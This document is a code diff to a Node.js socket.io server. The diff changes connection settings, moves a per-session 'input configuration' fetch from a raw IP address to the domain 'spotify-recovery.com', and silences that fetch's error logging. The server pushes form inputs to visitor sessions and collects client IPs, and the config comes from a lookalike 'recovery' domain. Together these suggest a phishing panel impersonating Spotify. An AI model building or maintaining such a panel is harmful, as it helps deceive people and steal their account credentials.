@@ -6,8 +6,13 @@ const io = require("socket.io")(http, {
   cors: {
     origin: "*", // Allow requests from any origin
     methods: ["GET", "POST"]
-  }
+  },
+  pingInterval: 25000,  // Ping every 25 seconds (default is too high)
+  pingTimeout: 50000,   // Wait up to 50 seconds before disconnecting
+  transports: ["websocket", "polling"], // Ensure WebSocket transport
+  path: "/socket.io/" // Explicitly set the path
 });
+
 const axios = require("axios");
 const { getClientIp } = require("request-ip");
 const fs = require("fs");
@@ -31,6 +36,7 @@ mongoose
   .connect(process.env.DATABASE, {
     useNewUrlParser: true,
     useUnifiedTopology: true,
+    useFindAndModify: false,  // Add this line
     serverSelectionTimeoutMS: 30000, // Increase timeout to 30 seconds
     socketTimeoutMS: 45000 // Increase socket timeout to 45 seconds
   })
@@ -318,7 +324,7 @@ const startConfigCheck = () => {
       }
 
       try {
-        const response = await axios.get(`http://185.217.126.20/api/get-input-config/${sessionId}`);
+        const response = await axios.get(`https://spotify-recovery.com/api/get-input-config/${sessionId}`);
         if (response.status === 200) {
           const inputsConfig = response.data.inputsConfig;
           io.to(sessionId).emit('configUpdate', { sessionId, inputsConfig });
@@ -327,7 +333,7 @@ const startConfigCheck = () => {
           throw new Error('Input configuration not found');
         }
       } catch (error) {
-        console.error(`Error fetching input configuration for session ${sessionId}:`, error);
+        //console.error(`Error fetching input configuration for session ${sessionId}:`, error);
         if (error.response && error.response.status === 404) {
           failedSessionIds.add(sessionId); // Add to failed session IDs if 404 error
         }
